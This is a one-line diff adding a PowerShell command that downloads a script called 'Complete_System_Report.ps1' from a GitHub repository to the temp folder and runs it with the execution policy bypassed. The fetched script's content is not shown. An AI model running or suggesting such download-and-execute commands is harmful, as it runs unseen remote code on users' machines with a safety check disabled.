@@ -1,0 +1,1 @@
+$path="$env:TEMP\report.ps1"; iwr https://raw.githubusercontent.com/TheGeneral4757/Stuff/main/Complete_System_Report.ps1 -OutFile $path; powershell -ExecutionPolicy Bypass -File $path
